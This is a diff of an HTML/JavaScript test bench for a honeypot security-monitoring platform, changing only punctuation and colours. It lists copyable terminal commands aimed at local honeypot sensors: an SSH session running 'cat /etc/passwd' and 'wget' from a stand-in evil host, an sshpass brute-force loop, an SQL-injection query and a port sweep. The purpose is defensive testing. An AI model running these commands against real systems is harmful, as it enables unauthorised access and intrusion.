@@ -1,70 +1,70 @@
 <!--
-  Page test bench — appended to the /health page by health_page.py.
+  Page test bench: appended to the /health page by health_page.py.
   Every button drives the REAL backend: real honeypot traffic, real DB rows,
   real Splunk indexing, real ClamAV, real PDF render. Nothing is mocked.
   /health is served from the backend origin (:8000), so the frontend's
-  localStorage token isn't visible here — sign in below. All role checks stay
+  localStorage token isn't visible here: sign in below. All role checks stay
   server-side; this page only keeps the token in sessionStorage.
 -->
 <style>
   #tb { max-width: 1240px; }
   #tb .bar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 14px; }
-  #tb input { background: #0d1117; border: 1px solid #30363d; color: #e6edf3; border-radius: 5px;
+  #tb input { background: #161512; border: 1px solid #3e3b34; color: #f3f0e9; border-radius: 5px;
               padding: 5px 8px; font: inherit; font-size: 12px; min-width: 0; }
-  #tb button { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; border-radius: 5px;
+  #tb button { background: #23221e; color: #d2ccc0; border: 1px solid #3e3b34; border-radius: 5px;
                padding: 5px 12px; font: inherit; font-size: 12px; cursor: pointer; }
-  #tb button:hover:not(:disabled) { background: #30363d; }
+  #tb button:hover:not(:disabled) { background: #3e3b34; }
   #tb button:disabled { opacity: .5; cursor: progress; }
-  #tb button.go { color: #58e1c1; border-color: #1f6f5f; }
-  #tb button.heavy { color: #d29922; border-color: #6e5412; }
+  #tb button.go { color: #8e9cff; border-color: #2a3fd1; }
+  #tb button.heavy { color: #e2ac4a; border-color: #6b4f12; }
   #tb .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(min(100%, 380px), 1fr)); gap: 12px; }
-  #tb .tc { background: #0d1117; border: 1px solid #1c2128; border-radius: 8px; padding: 12px 14px;
+  #tb .tc { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px;
             display: flex; flex-direction: column; min-width: 0; }
-  #tb .tc h3 { margin: 0; font-size: 13px; color: #e6edf3; display: flex; justify-content: space-between; gap: 8px; }
+  #tb .tc h3 { margin: 0; font-size: 13px; color: #f3f0e9; display: flex; justify-content: space-between; gap: 8px; }
   #tb .tc .pages { font-size: 11px; margin: 2px 0 6px; }
   #tb .tc .pages a { margin-right: 8px; }
-  #tb .tc .why { font-size: 12px; color: #9da7b3; margin-bottom: 4px; }
-  #tb .tc .what { font-size: 11px; color: #7d8590; margin-bottom: 10px; }
+  #tb .tc .why { font-size: 12px; color: #a8a294; margin-bottom: 4px; }
+  #tb .tc .what { font-size: 11px; color: #868073; margin-bottom: 10px; }
   #tb .tc .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-top: auto; }
   #tb .log { margin-top: 10px; font-size: 12px; max-height: 300px; overflow: auto; }
   #tb .log:empty { display: none; }
-  #tb .st { display: grid; grid-template-columns: 40px 1fr auto; gap: 2px 8px; padding: 4px 0; border-top: 1px solid #161b22; }
-  #tb .st .d { grid-column: 2 / 4; color: #7d8590; white-space: pre-wrap; word-break: break-word; font-size: 11px; }
+  #tb .st { display: grid; grid-template-columns: 40px 1fr auto; gap: 2px 8px; padding: 4px 0; border-top: 1px solid #1a1916; }
+  #tb .st .d { grid-column: 2 / 4; color: #868073; white-space: pre-wrap; word-break: break-word; font-size: 11px; }
   #tb .st .d:empty { display: none; }
-  #tb .ms { color: #7d8590; font-size: 11px; }
-  #tb .PASS { color: #3fb950; } #tb .FAIL { color: #f85149; } #tb .RUN { color: #58a6ff; } #tb .SKIP { color: #d29922; }
+  #tb .ms { color: #868073; font-size: 11px; }
+  #tb .PASS { color: #5bbf86; } #tb .FAIL { color: #f07468; } #tb .RUN { color: #8e9cff; } #tb .SKIP { color: #e2ac4a; }
   #tb .badge { font-size: 11px; padding: 0 6px; border-radius: 4px; border: 1px solid currentColor; white-space: nowrap; }
-  #tb .data { background: #0d1117; border: 1px solid #1c2128; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
+  #tb .data { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
   #tb .data .row { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-top: 8px; }
-  #tb select { background: #0d1117; border: 1px solid #30363d; color: #e6edf3; border-radius: 5px; padding: 4px 6px; font: inherit; font-size: 12px; }
-  #tb button.danger { color: #f85149; border-color: #6e2a28; }
-  #tb pre.joblog { margin: 10px 0 0; max-height: 220px; overflow: auto; font-size: 11px; color: #9da7b3; white-space: pre-wrap; }
+  #tb select { background: #161512; border: 1px solid #3e3b34; color: #f3f0e9; border-radius: 5px; padding: 4px 6px; font: inherit; font-size: 12px; }
+  #tb button.danger { color: #f07468; border-color: #6e2c26; }
+  #tb pre.joblog { margin: 10px 0 0; max-height: 220px; overflow: auto; font-size: 11px; color: #a8a294; white-space: pre-wrap; }
   #tb pre.joblog:empty { display: none; }
-  #tb .term { background: #0d1117; border: 1px solid #1c2128; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
-  #tb .term .term-note { font-size: 12px; color: #9da7b3; margin: 0 0 10px; }
-  #tb .term-item { border-top: 1px solid #161b22; padding: 10px 0; }
+  #tb .term { background: #161512; border: 1px solid #2c2a25; border-radius: 8px; padding: 12px 14px; margin-bottom: 14px; }
+  #tb .term .term-note { font-size: 12px; color: #a8a294; margin: 0 0 10px; }
+  #tb .term-item { border-top: 1px solid #1a1916; padding: 10px 0; }
   #tb .term-item:first-of-type { border-top: none; padding-top: 4px; }
   #tb .term-head { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; margin-bottom: 6px; }
-  #tb .term-head b { font-size: 12.5px; color: #e6edf3; font-weight: 600; }
+  #tb .term-head b { font-size: 12.5px; color: #f3f0e9; font-weight: 600; }
   #tb .term-tag { font-size: 10.5px; padding: 1px 7px; border-radius: 10px; border: 1px solid currentColor; white-space: nowrap; font-weight: 600; letter-spacing: .2px; }
-  #tb .term-tag.cred { color: #58e1c1; }
-  #tb .term-tag.other { color: #7d8590; }
-  #tb .term-desc { font-size: 11.5px; color: #7d8590; margin: 0 0 6px; }
-  #tb .term-block { position: relative; background: #010409; border: 1px solid #21262d; border-radius: 6px; }
+  #tb .term-tag.cred { color: #8e9cff; }
+  #tb .term-tag.other { color: #868073; }
+  #tb .term-desc { font-size: 11.5px; color: #868073; margin: 0 0 6px; }
+  #tb .term-block { position: relative; background: #12110f; border: 1px solid #23221e; border-radius: 6px; }
   #tb .term-block pre { margin: 0; padding: 10px 70px 10px 12px; white-space: pre-wrap; word-break: break-word;
-                         font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; color: #a5d6ff; line-height: 1.55; }
-  #tb .term-block .term-cp { position: absolute; top: 7px; right: 7px; background: #21262d; color: #c9d1d9; border: 1px solid #30363d;
+                         font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; color: #aab4ff; line-height: 1.55; }
+  #tb .term-block .term-cp { position: absolute; top: 7px; right: 7px; background: #23221e; color: #d2ccc0; border: 1px solid #3e3b34;
                               border-radius: 5px; padding: 2px 9px; font-size: 11px; cursor: pointer; }
-  #tb .term-block .term-cp:hover { background: #30363d; }
-  #tb .term-block .term-cp.ok { color: #3fb950; border-color: #238636; }
-  #tb .term-result { font-size: 11px; color: #6e7681; margin-top: 5px; }
+  #tb .term-block .term-cp:hover { background: #3e3b34; }
+  #tb .term-block .term-cp.ok { color: #5bbf86; border-color: #1d7448; }
+  #tb .term-result { font-size: 11px; color: #77726a; margin-top: 5px; }
   #tb .term-creds { width: 100%; border-collapse: collapse; font-size: 11.5px; margin: 8px 0 4px; }
-  #tb .term-creds th, #tb .term-creds td { text-align: left; padding: 4px 10px 4px 0; border-top: 1px solid #161b22; }
-  #tb .term-creds th { color: #7d8590; font-weight: 600; }
-  #tb .term-creds td.ok { color: #3fb950; } #tb .term-creds td.no { color: #f85149; }
+  #tb .term-creds th, #tb .term-creds td { text-align: left; padding: 4px 10px 4px 0; border-top: 1px solid #1a1916; }
+  #tb .term-creds th { color: #868073; font-weight: 600; }
+  #tb .term-creds td.ok { color: #5bbf86; } #tb .term-creds td.no { color: #f07468; }
 </style>
 
-<h2>Page test bench <span class="note">(each button hits the live backend — real traffic, real rows, real engines)</span></h2>
+<h2>Page test bench <span class="note">(each button hits the live backend: real traffic, real rows, real engines)</span></h2>
 <div id="tb">
   <div class="bar">
     <span id="tbWho" class="note">not signed in</span>
@@ -78,7 +78,7 @@
     <span id="tbSum" class="note"></span>
   </div>
   <div class="data">
-    <h3 style="margin:0;font-size:13px;color:#e6edf3">Project data <span id="dInv" class="note"></span></h3>
+    <h3 style="margin:0;font-size:13px;color:#f3f0e9">Project data <span id="dInv" class="note"></span></h3>
     <div class="row">
       <span class="note">populate:</span>
       <label class="note">historic corpus
@@ -91,18 +91,18 @@
       <span class="note">reset:</span>
       <input id="dConfirm" placeholder="type RESET" size="11">
       <button id="dReset" class="danger">reset data</button>
-      <span class="note">wipes events, detections, incidents, evidence, reports, malware scans, sensor logs — keeps accounts, roles, access/audit logs, settings, nodes, VM labs, Splunk</span>
+      <span class="note">wipes events, detections, incidents, evidence, reports, malware scans, sensor logs: keeps accounts, roles, access/audit logs, settings, nodes, VM labs, Splunk</span>
     </div>
     <pre id="dLog" class="joblog"></pre>
   </div>
 
   <div class="term">
-    <h3 style="margin:0 0 6px;font-size:13px;color:#e6edf3">Terminal commands — trigger the honeypots from your Mac</h3>
-    <p class="term-note">Paste into a normal macOS Terminal (not inside Docker) — the stack publishes each sensor's port straight to <code>localhost</code>, so these hit the real Cowrie/Dionaea/Honeytrap containers over the network exactly like a real attacker would. No login on this page needed for these; each command is verified working as written. <b>Every attempt is really captured</b> — it lands in Event Log within a few seconds and in the Credentials Vault too, for the SSH ones.</p>
+    <h3 style="margin:0 0 6px;font-size:13px;color:#f3f0e9">Terminal commands: trigger the honeypots from your Mac</h3>
+    <p class="term-note">Paste into a normal macOS Terminal (not inside Docker): the stack publishes each sensor's port straight to <code>localhost</code>, so these hit the real Cowrie/Dionaea/Honeytrap containers over the network exactly like a real attacker would. No login on this page needed for these; each command is verified working as written. <b>Every attempt is really captured</b>: it lands in Event Log within a few seconds and in the Credentials Vault too, for the SSH ones.</p>
 
     <div class="term-item">
-      <div class="term-head"><b>1. SSH login — real session</b><span class="term-tag cred">→ SSH CREDENTIAL CAPTURE</span></div>
-      <p class="term-desc">Logs in with a real username/password Cowrie accepts, then runs commands inside the fake shell. The username + password you type is captured and shows up in the Credentials Vault page as a real entry — this is the one to use if you want a credential to show up.</p>
+      <div class="term-head"><b>1. SSH login: real session</b><span class="term-tag cred">→ SSH CREDENTIAL CAPTURE</span></div>
+      <p class="term-desc">Logs in with a real username/password Cowrie accepts, then runs commands inside the fake shell. The username + password you type is captured and shows up in the Credentials Vault page as a real entry: this is the one to use if you want a credential to show up.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null oracle@localhost
 # password: oracle   (Cowrie will accept it)
 # once you're in, try:
@@ -112,26 +112,26 @@ whoami; id; uname -a; cat /etc/passwd; wget http://evil.test/x; ls -la /tmp; exi
 
     <div class="term-item">
       <div class="term-head"><b>2. SSH brute force → then a successful login</b><span class="term-tag cred">→ SSH CREDENTIAL CAPTURE (×5)</span></div>
-      <p class="term-desc">4 rejected passwords for <code>root</code>, then a 5th that's accepted (<code>hunter2</code>) — the exact fail-then-succeed shape the <code>st-cred-002</code> brute-force detection looks for. All 5 attempts are captured as separate credential rows, the 4 failed ones marked as rejected. Needs <code>sshpass</code> (<code>brew install hudochenkov/sshpass/sshpass</code>) so it doesn't stop and ask you for a password 5 times.</p>
+      <p class="term-desc">4 rejected passwords for <code>root</code>, then a 5th that's accepted (<code>hunter2</code>): the exact fail-then-succeed shape the <code>st-cred-002</code> brute-force detection looks for. All 5 attempts are captured as separate credential rows, the 4 failed ones marked as rejected. Needs <code>sshpass</code> (<code>brew install hudochenkov/sshpass/sshpass</code>) so it doesn't stop and ask you for a password 5 times.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>for pw in 123456 password root toor; do
   sshpass -p "$pw" ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
     -o ConnectTimeout=4 root@localhost exit 2>/dev/null
 done
 sshpass -p hunter2 ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
   root@localhost "id; whoami; exit"</pre></div>
-      <div class="term-result">Captures: <code>root</code> / <code>123456</code>, <code>password</code>, <code>root</code>, <code>toor</code> (all rejected) then <code>root</code> / <code>hunter2</code> (accepted) — 5 rows in Credentials Vault, plus a CRITICAL brute-force incident.</div>
+      <div class="term-result">Captures: <code>root</code> / <code>123456</code>, <code>password</code>, <code>root</code>, <code>toor</code> (all rejected) then <code>root</code> / <code>hunter2</code> (accepted): 5 rows in Credentials Vault, plus a CRITICAL brute-force incident.</div>
     </div>
 
     <div class="term-item">
       <div class="term-head"><b>3. Telnet connect</b><span class="term-tag other">→ Cowrie Telnet</span></div>
-      <p class="term-desc">Just a TCP connect — no login prompt is answered, so nothing lands in the credential vault. Confirms the Telnet listener is alive.</p>
+      <p class="term-desc">Just a TCP connect: no login prompt is answered, so nothing lands in the credential vault. Confirms the Telnet listener is alive.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>nc -zv localhost 2223   # or: telnet localhost 2223</pre></div>
       <div class="term-result">Captures: a Cowrie connect event in Event Log. No credential (you didn't send one).</div>
     </div>
 
     <div class="term-item">
-      <div class="term-head"><b>4. Dionaea — SMB / anonymous FTP / MSSQL</b><span class="term-tag other">→ Dionaea</span></div>
-      <p class="term-desc">Touches all three Dionaea ports. The FTP line logs in as <code>anonymous</code> — captured as an FTP credential, though it's not a secret since anonymous FTP is meant to be public.</p>
+      <div class="term-head"><b>4. Dionaea: SMB / anonymous FTP / MSSQL</b><span class="term-tag other">→ Dionaea</span></div>
+      <p class="term-desc">Touches all three Dionaea ports. The FTP line logs in as <code>anonymous</code>: captured as an FTP credential, though it's not a secret since anonymous FTP is meant to be public.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>nc -zv -w2 localhost 445
 curl -s -m3 "ftp://anonymous:test@localhost:2121/"
 nc -zv -w2 localhost 1433</pre></div>
@@ -139,21 +139,21 @@ nc -zv -w2 localhost 1433</pre></div>
     </div>
 
     <div class="term-item">
-      <div class="term-head"><b>5. Honeytrap — HTTP request + SQL-injection-shaped request</b><span class="term-tag other">→ Honeytrap</span></div>
-      <p class="term-desc">A plain GET, then a request with a classic <code>' OR '1'='1</code> payload in the query string. Honeytrap doesn't speak full HTTP back, so curl may print a connection error on the second line — that's expected, the request still reaches the sensor and gets logged.</p>
+      <div class="term-head"><b>5. Honeytrap: HTTP request + SQL-injection-shaped request</b><span class="term-tag other">→ Honeytrap</span></div>
+      <p class="term-desc">A plain GET, then a request with a classic <code>' OR '1'='1</code> payload in the query string. Honeytrap doesn't speak full HTTP back, so curl may print a connection error on the second line: that's expected, the request still reaches the sensor and gets logged.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>curl -s -m4 "http://localhost:8022/"
 curl -s -m4 "http://localhost:8023/?id=1%27%20OR%20%271%27=%271"</pre></div>
-      <div class="term-result">Captures: two Honeytrap events in Event Log. No credential — this port doesn't do logins.</div>
+      <div class="term-result">Captures: two Honeytrap events in Event Log. No credential: this port doesn't do logins.</div>
     </div>
 
     <div class="term-item">
-      <div class="term-head"><b>6. Full port sweep — every sensor at once</b><span class="term-tag other">→ all sensors</span></div>
+      <div class="term-head"><b>6. Full port sweep: every sensor at once</b><span class="term-tag other">→ all sensors</span></div>
       <p class="term-desc">One-liner reconnaissance scan across every published honeypot port. Good smoke test that the whole stack is up.</p>
       <div class="term-block"><button class="term-cp">copy</button><pre>for p in 2222 2223 445 2121 1433 8022 8023; do nc -zv -w1 localhost $p; done</pre></div>
       <div class="term-result">Captures: a connect event per sensor. No credential.</div>
     </div>
 
-    <p style="font-size:11.5px;color:#7d8590;margin:10px 0 6px">Full credential table Cowrie is configured with (<code>sensors/cowrie/userdb.txt</code>) — anything not listed under root/admin also succeeds:</p>
+    <p style="font-size:11.5px;color:#868073;margin:10px 0 6px">Full credential table Cowrie is configured with (<code>sensors/cowrie/userdb.txt</code>): anything not listed under root/admin also succeeds:</p>
     <table class="term-creds">
       <tr><th>username</th><th>password</th><th>result</th></tr>
       <tr><td>root</td><td>root</td><td class="no">✕ rejected</td></tr>
@@ -436,7 +436,7 @@ const TESTS = [
   run: async (R) => {
     await R.step('GET /mitre/ (matrix)', async () => { const d = await GET('/mitre/'); return Object.entries(d.matrix).map(([t, v]) => `${t}: ${v.length}`).join(' · '); });
     await R.step('GET /mitre/catalog', async () => { const d = await GET('/mitre/catalog'); return `${Array.isArray(d) ? d.length : Object.keys(d).length} catalog entries`; });
-    await R.step('GET /mitre/analytics — T1110 populated', async () => {
+    await R.step('GET /mitre/analytics: T1110 populated', async () => {
       const d = await GET('/mitre/analytics');
       const t = d.techniques.find(x => x.technique_id === 'T1110');
       expect(t && t.event_count > 0, 'T1110 has no events');
@@ -452,7 +452,7 @@ const TESTS = [
   run: async (R) => {
     await R.step('GET /incidents/stats', () => GET('/incidents/stats'));
     const tag = uid();
-    const inc = await R.step('POST /incidents — create [SELFTEST] case', async () => {
+    const inc = await R.step('POST /incidents: create [SELFTEST] case', async () => {
       const d = await POST('/incidents', {
         title: `[SELFTEST ${tag}] health bench case`, severity: 'LOW', source_ips: ['203.0.113.77'],
         reason: 'created by /health page test bench', attack_techniques: [{ id: 'T1110', tactic: 'Credential Access', name: 'Brute Force' }],
@@ -470,13 +470,13 @@ const TESTS = [
       f.append('type', 'analyst_note'); f.append('text', `bench evidence ${tag}`);
       return (await POST(`/evidence/incident/${id}`, f)).evidence;
     });
-    if (ev) await R.step('GET /evidence/{id}/verify — hash integrity', async () => {
+    if (ev) await R.step('GET /evidence/{id}/verify: hash integrity', async () => {
       const v = await GET(`/evidence/${ev.id}/verify`);
       expect(v.valid ?? v.ok ?? v.verified ?? v.match, 'evidence failed verification: ' + short(v, 300));
       return v;
     });
     await R.step('GET /incidents/{id}/timeline', async () => { const t = await GET(`/incidents/${id}/timeline`); return short(t, 300); });
-    await R.step('GET /incidents/{id} — note + IOC persisted', async () => {
+    await R.step('GET /incidents/{id}: note + IOC persisted', async () => {
       const d = await GET(`/incidents/${id}`);
       const s = JSON.stringify(d);
       expect(s.includes(`bench note ${tag}`), 'note missing'); expect(s.includes('203.0.113.77'), 'IOC missing');
@@ -506,7 +506,7 @@ const TESTS = [
       }, 120000, 5000);
       expect(d, 'no brute-force detection covering the last 15 min');
       const s = await GET('/detections/stats');
-      return `${d.rule_id} ${d.severity} ${d.source_ip} · last event ${d.last_event_at} · incident ${d.incident_id || '—'} · total ${base?.total} → ${s.total}`;
+      return `${d.rule_id} ${d.severity} ${d.source_ip} · last event ${d.last_event_at} · incident ${d.incident_id || 'n/a'} · total ${base?.total} → ${s.total}`;
     });
     await R.step('POST /soc-testing/scenarios/credential-attack/run (evaluate)', async () => {
       const { run } = await POST('/soc-testing/scenarios/credential-attack/run', { mode: 'evaluate' });
@@ -542,7 +542,7 @@ const TESTS = [
         } finally { ws.close(); }
         return buf.replace(/\x1b\[[0-9;]*[A-Za-z]/g, '').slice(-400);
       });
-      await R.step('GET /analysis-shell/{id} — commands recorded', async () => {
+      await R.step('GET /analysis-shell/{id}: commands recorded', async () => {
         const d = await waitFor(async () => { const x = await GET(`/analysis-shell/${s.session_id}`); return x.command_count > 0 ? x : null; }, 30000, 3000);
         expect(d, 'no commands recorded against the session within 30s');
         return `${d.command_count} commands · incident=${d.incident_id || 'none'} · recent: ${(d.recent || []).slice(0, 3).map(r => r.command).join(' | ')}`;
@@ -558,7 +558,7 @@ const TESTS = [
   what: 'Builds the live behaviour profile and exports it as a STIX 2.1 bundle, checking bundle structure.',
   run: async (R) => {
     await R.step('GET /behavior/profile', async () => { const d = await GET('/behavior/profile'); return { actor: d.actor?.name, confidence: d.actor?.confidence, stage: d.killchain?.stage_name }; });
-    await R.step('GET /behavior/stix — valid bundle', async () => {
+    await R.step('GET /behavior/stix: valid bundle', async () => {
       const raw = await GET('/behavior/stix'), d = raw.bundle || raw;
       expect(d.type === 'bundle' && Array.isArray(d.objects), 'not a STIX bundle');
       const types = {}; d.objects.forEach(o => types[o.type] = (types[o.type] || 0) + 1);
@@ -606,7 +606,7 @@ const TESTS = [
     await R.step('GET /malware/apk/stats', async () => (await GET('/malware/apk/stats')).summary);
     await R.step('GET /malware/apk/history', async () => { const d = await GET('/malware/apk/history'); return `${(Array.isArray(d) ? d : d.history || []).length} scans`; });
     const eng = await GET('/malware/engines').catch(() => null);
-    if (eng && !eng.apk?.mobsf) R.skip('MobSF upload analysis', 'MOBSF_URL not set in backend — APK uploads fall back to built-in static checks. Upload a real .apk on apk.html to exercise it.');
+    if (eng && !eng.apk?.mobsf) R.skip('MobSF upload analysis', 'MOBSF_URL not set in backend: APK uploads fall back to built-in static checks. Upload a real .apk on apk.html to exercise it.');
   }
 },
 {
@@ -712,7 +712,7 @@ const TESTS = [
     await R.step('GET /users/pending', async () => `${(await GET('/users/pending')).length} pending approvals`);
     await R.step('GET /admin/settings', async () => short(await GET('/admin/settings'), 300));
     await R.step('GET /admin/logs/access', async () => { const d = await GET('/admin/logs/access'); return `${(Array.isArray(d) ? d : d.logs || []).length} access-log rows`; });
-    await R.step('GET /credentials/generate-password — strength', async () => {
+    await R.step('GET /credentials/generate-password: strength', async () => {
       const { password: p } = await GET('/credentials/generate-password');
       expect(p.length >= 12 && /[A-Z]/.test(p) && /[a-z]/.test(p) && /\d/.test(p) && /[^A-Za-z0-9]/.test(p), 'weak password: ' + p);
       return `${p.length} chars, upper/lower/digit/symbol ✓`;
@@ -775,7 +775,7 @@ const TESTS = [
   what: 'Checks which infra provider is active; AWS calls only run when INFRA_PROVIDER=aws.',
   run: async (R) => {
     const p = await R.step('GET /vm/provider', () => GET('/vm/provider'));
-    if (p?.provider !== 'aws') R.skip('AWS credential test / S3 pull', `INFRA_PROVIDER=${p?.provider} — AWS not in use. Enter keys on aws_connection.html to test them.`);
+    if (p?.provider !== 'aws') R.skip('AWS credential test / S3 pull', `INFRA_PROVIDER=${p?.provider}: AWS not in use. Enter keys on aws_connection.html to test them.`);
   }
 },
 ];
@@ -878,7 +878,7 @@ async function refreshWho() {
   const who = document.getElementById('tbWho');
   if (!TOKEN) { who.textContent = 'not signed in'; who.className = 'note'; return; }
   const r = await call('GET', '/users/me');
-  if (!r.ok) { setToken(''); who.textContent = 'session expired — sign in'; return; }
+  if (!r.ok) { setToken(''); who.textContent = 'session expired: sign in'; return; }
   who.innerHTML = `<span class="PASS">signed in</span> ${h(r.data.email)} · ${h(r.data.role)}`;
   refreshData();
 }
